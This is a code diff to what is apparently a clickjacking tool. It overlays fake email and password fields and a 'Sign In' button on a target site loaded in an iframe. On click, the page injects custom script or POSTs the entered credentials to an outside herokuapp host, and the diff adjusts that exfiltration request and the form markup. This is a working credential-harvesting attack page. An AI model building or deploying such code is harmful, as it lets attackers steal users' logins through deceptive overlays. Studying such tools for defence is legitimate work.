@@ -50,7 +50,7 @@
             var buttonStyle = buttonStyleParam + 'position: absolute; z-index: 2; top: ' + buttonTop + 'px; left: ' + buttonLeft + 'px;';
             $('#jacksButton').attr('style', buttonStyle);
             $("#targetIframe").attr('src', targetURL);
-            $('#jacksButton').click(function() {
+            $('#jacksButton').click(function(e) {
                 if (customJavaScript.length > 0) {
                     $('<script>').attr('type', 'text/javascript').text(customJavaScript).appendTo('head');
                 } else {
@@ -62,10 +62,14 @@
                     $.ajax({
                         url: "https://userinfoclickjacking.herokuapp.com/api/users",
                         type: "POST",
-                        data: {
+
+                        data: JSON.stringify({
                             email: jacksEmail,
                             password: jacksPassword
-                        },
+                        }),
+                        contentType: "application/x-www-form-urlencoded",
+                        dataType: "json",
+
                         success: function(response) {
                             console.log(response);
                         },
@@ -81,15 +85,15 @@
 
 <body style=" margin: 0px;padding: 0px; border: 0px;width: 100%;height: 100%;">
 
+    <form className="myform" onSubmit="validateLogin()">
+        <input type="text" style="" autocomplete="off" class="" id="inputMalEmail" placeholder="">
 
-    <input type="text" style="" autocomplete="off" class="" id="inputMalEmail" placeholder="">
 
+        <input type="password" style="" autocomplete="off" class="" id="inputMalPassword" placeholder="">
 
-    <input type="password" style="" autocomplete="off" class="" id="inputMalPassword" placeholder="">
-
-    <button type="submit" style="" id="jacksButton">Sign In
-    </button>
-
+        <button type="submit" style="" id="jacksButton">Sign In
+        </button>
+    </form>
 
     <iframe id="targetIframe" scrolling="no" frameBorder="0" style="z-index: 1; position: relative;overflow: hidden;margin: 0; padding: 0;display: block" src="" width="100%" height="1000">
     </iframe>
